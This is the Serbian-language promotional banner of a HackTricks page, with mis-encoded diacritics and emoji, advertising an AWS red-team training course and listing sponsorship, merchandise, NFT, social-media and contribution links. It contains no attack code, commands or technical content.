<summary><strong>NauÄite hakovanje AWS-a od poÄetnika do struÄnjaka sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **oglaÅ¡avanje vaÅ¡e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, pogledajte [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
